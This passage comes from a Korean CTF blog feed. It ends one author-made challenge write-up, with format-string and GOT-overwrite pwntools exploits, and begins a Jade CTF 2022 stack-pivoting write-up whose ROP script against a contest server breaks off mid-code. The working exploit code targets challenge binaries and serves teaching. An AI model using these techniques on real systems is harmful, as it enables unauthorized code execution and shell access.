class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">pause()</span><br><span class="line">Exchange(stack_leak + <span class="number">0xb8</span>, stack_leak - <span class="number">0x8</span>) <span class="comment"># buf -&gt; read ret</span></span><br><span class="line">Buy(p64(e.sym[<span class="string">&#x27;gift&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="loop-횟수-변경"><a href="#loop-횟수-변경" class="headerlink" title="loop 횟수 변경"></a>loop 횟수 변경</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1)</span><br><span class="line">b&#x27;\xff\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xf6\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xff\xff\xff\xff\xf6\xff\xff\xff&#x27;</span><br></pre></td></tr></table></figure><p>위 바이트 문자열을 long long int로 unpack하면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;q&#x27;, (struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)))</span><br><span class="line">(-38654705665,)</span><br></pre></td></tr></table></figure><p>참고로 굳이 loop 횟수를 변경하지 않아도 된다. 그 이유는 우리는 stack과 pie만 구하면 되는데 fsb가 터질 때 글자 수가 충분하기 때문이다.</p><h2 id="Exploit-Scnario-2"><a href="#Exploit-Scnario-2" class="headerlink" title="Exploit Scnario 2"></a>Exploit Scnario 2</h2><ol><li>stack address를 구한 뒤, loop 횟수 변경</li><li>libc base 구하기</li><li>pie base 구하기</li><li><code>*ABS*@got.plt</code>를 gift 함수 주소로 덮기 (got overwriting)</li></ol><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">pause()</span><br><span class="line">Buy(<span class="string">&#x27;%37$p_&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x23290</span></span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc.address)) <span class="comment"># libc base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [4]</span></span><br><span class="line">abs_got = libc.address + <span class="number">0x1d8050</span></span><br><span class="line">info(<span class="string">&#x27;abs got :: &#x27;</span> + <span class="built_in">hex</span>(abs_got))</span><br><span class="line"></span><br><span class="line">Exchange(abs_got, e.sym[<span class="string">&#x27;gift&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="GOT-overwriting"><a href="#GOT-overwriting" class="headerlink" title="GOT overwriting"></a>GOT overwriting</h3><p>Full RELRO임에도 GOT overwriting이 가능하다.</p><p>puts의 구현 초반부를 gdb에서 확인하면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ab33aa0 &lt;puts&gt;:       endbr64</span><br><span class="line">0x7fa31ab33aa4 &lt;puts+4&gt;:     push   r14</span><br><span class="line">0x7fa31ab33aa6 &lt;puts+6&gt;:     push   r13</span><br><span class="line">0x7fa31ab33aa8 &lt;puts+8&gt;:     push   r12</span><br><span class="line">0x7fa31ab33aaa &lt;puts+10&gt;:    mov    r12,rdi</span><br><span class="line">0x7fa31ab33aad &lt;puts+13&gt;:    push   rbp</span><br><span class="line">0x7fa31ab33aae &lt;puts+14&gt;:    push   rbx</span><br><span class="line">0x7fa31ab33aaf &lt;puts+15&gt;:    sub    rsp,0x10</span><br><span class="line">0x7fa31ab33ab3 &lt;puts+19&gt;:    call   0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;</span><br></pre></td></tr></table></figure><p><code>*ABS*+0x9d080@plt</code> 을 call하고 있는데, 안에 들어가서 확인해보면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;:  endbr64</span><br><span class="line">0x7fa31aae12b4 &lt;*ABS*+0x9d080@plt+4&gt;:        bnd jmp QWORD PTR [rip+0x1b5d95]        # 0x7fa31ac97050 &lt;*ABS*@got.plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vm 0x7fa31ac97050</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x007fa31ac97000 0x007fa31ac99000 0x000000001d8000 rw- /usr/lib/libc.so.6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>*ABS*@got.plt</code> 주소를 참조해서 jmp하므로 gift로 바꿔서 익스하면 될 듯 하다. 풀렐로 임에도 불구하고 쓰기 권한이 존재한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x00007fa31ac27920</span><br></pre></td></tr></table></figure><p>overwriting 후.. <code>*ABS*@got.plt</code> 주소에 gift 주소를 저장시킬 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x0000558eefe46257</span><br></pre></td></tr></table></figure><p>이 후에 <code>puts</code> 함수가 실행된다면 gift 함수가 실행될 것이다.</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>Demon 팀으로써 CTF 문제를 출제한 것 중에 가장 공을 들였고 오래걸렸다. 최신 libc를 가진 문제는 많이 풀이를 안해봐서 두 번째 익스 방법은 몰랐다. 새로운 것을 배워서 기분이 좋다 :) 이 문제 덕분에 최신 libc도 분석을 해보았는데 관련 내용은 Docs 카테고리에 (언젠간) 업뎃할 예정이다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Making </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FULL RELRO </tag>
            
            <tag> Power Of XX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Guess game (Stack pivoting)</title>
      <link href="/221028-jadectf2022-guess_game/"/>
      <url>/221028-jadectf2022-guess_game/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(16&#x2F;630) solves</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chall</span><br><span class="line">└── libc.so.6</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  fill_secret_buffer();</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Welcome to my game, choose any number between 1-10\n&quot;</span>, <span class="number">0x33</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter a number: &quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">10</span> || v4 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Wrong number entered\n&quot;</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    odd_option();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    even_option();                              <span class="comment">// not vuln</span></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Bye bye\n&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 함수에서 수 하나를 입력받는데 0부터 9사이의 범위만 인정한다. 그 다음 &amp; 연산을 진행하는데 입력 값이 홀수라면 <code>odd_option()</code> 함수를 실행하고 아니라면 <code>even_option()</code> 함수를 실행한다. 후자의 함수에 취약점이 없기 때문에 간단하게 먼저 살펴보자.</p><h4 id="1-even-option"><a href="#1-even-option" class="headerlink" title="1. even_option()"></a>1. even_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">even_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter your name: &quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;Hello %s, we are sorry but you gave us the wrong input. Please try again.\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">2</span>, temp_buffer, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>지역변수 s에 이름을 입력받는다. bof가 일어날 가능성을 염두에 뒀지만 108 크기에 100만큼 입력하기 때문에 bof는 일어나지 않는다. 이 함수에서 취약점은 발생하지 않는다. </p><h4 id="2-odd-option"><a href="#2-odd-option" class="headerlink" title="2. odd_option()"></a>2. odd_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">odd_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">108</span>]; <span class="comment">// [rsp+D0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+13Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Let&#x27;s begin, but first here is how you play:\n&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- A number will be shown to you\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- You have to enter two strings\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The first should be your name\n&quot;</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The second string should be equal to the secret code\n&quot;</span>, <span class="number">0x39</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- If you successfully guess the secret code, you win!\n&quot;</span>, <span class="number">0x36</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;\nHere&#x27;s the number: %lld\n&quot;</span>, s);</span><br><span class="line">  write(<span class="number">2</span>, temp_buffer, v3);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter first input please: &quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">200</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter second input please: &quot;</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  fgets(dest, <span class="number">130</span>, <span class="built_in">stdin</span>); <span class="comment">// bof</span></span><br><span class="line">  result = <span class="built_in">strcpy</span>(dest, secret_buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Congrats! You win!\n&quot;</span>, <span class="number">0x13</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>208 크기의 지역변수 s에 200만큼 입력하고 108 크기의 지역변수 dest에 130만큼 입력한다. 여기서 bof가 발생한다. 바로 뒤에 srctpy함수에서 secret_buffer를 dest에 복사한다.<br>이 함수가 실행되기 전에 main에서 <code>fill_secret_buffer()</code> 함수를 호출하는데 여기서 secret_buffer 전역변수를 채운다.</p><p>결론적으로 알아낸 것은 지역변수 dest에서 130-0x70 즉, 18만큼 overflow가 난다는 것이다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>overflow가 18만큼난다? sfp(rbp), ret..</p><p>ret까지 안전하게 덮고 2바이트 더 overflow가 난다. ROP를 하기에는 overflow가 충분히 나지 않는다. 이럴 때 해야하는 것이 Stack pivoting이다. 이와 관련해서는 (구 블로그에도 써놨지만) 시간이 된다면 이 블로그에 글을 새로 쓸 예정이다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>overflow가 ret까지 날 때는 stack pivoting 기법을 고려해볼 수 있겠다. 이를 위해서 fake stack을 구성할 공간이 필요하다. 이 문제에서는 “Enter first input please: “에서 지역변수 s에 200만큼 입력할 수 있다. 200바이트면 ROP 페이로드를 적기에 충분하다. 여기를 fake stack으로 한다! 땅땅</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="PART1"><a href="#PART1" class="headerlink" title="PART1"></a>PART1</h4><ol><li>libc leak하는 ROP 페이로드를 작성하여 stack에 구성</li><li>위 stack으로 흐름 변경</li></ol><h4 id="PART2"><a href="#PART2" class="headerlink" title="PART2"></a>PART2</h4><ol><li><code>system(&#39;/bin/sh\x00&#39;)</code>을 호출하는 ROP 페이로드를 작성하여 stack에 구성</li><li>위 stack으로 흐름 변경</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400946</span></span><br><span class="line">ret = <span class="number">0x04006b9</span></span><br><span class="line"></span><br><span class="line">fake_stack= <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>])</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">stack_pivoting_gadget = <span class="number">0x0400B1C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;libc leak :: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;offset :: &#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]))</span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak 2 :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">fake_stack = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += 